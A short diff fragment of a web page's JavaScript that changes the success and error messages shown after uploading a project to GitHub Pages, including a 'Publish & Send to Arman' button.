+                    const liveUrl = `https://${GITHUB_USER}.github.io/${REPO_NAME}/${projectName}/`;
+                    statusDiv.style.color = '#22c55e';
+                    statusDiv.innerHTML = `Success! Your site is live: <br><a href="${liveUrl}" target="_blank" style="color: #00f2fe; word-break: break-all;">${liveUrl}</a>`;
+                } else {
+                    const errJson = await response.json();
+                    throw new Error(errJson.message || 'Upload failed');
+                }
             } catch (error) {
-                errorBox.innerText = "❌ Error: " + error.message;
-                errorBox.classList.remove('hidden');
+                statusDiv.style.color = '#ef4444';
+                statusDiv.textContent = 'Error: GitHub upload failed. ' + error.message;
             } finally {
-                btn.disabled = false;
-                btn.innerText = "🚀 Publish & Send to Arman";
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Publish & Send to Arman';
             }
         });
     </script>
 </body>
-        </html>
+</html>
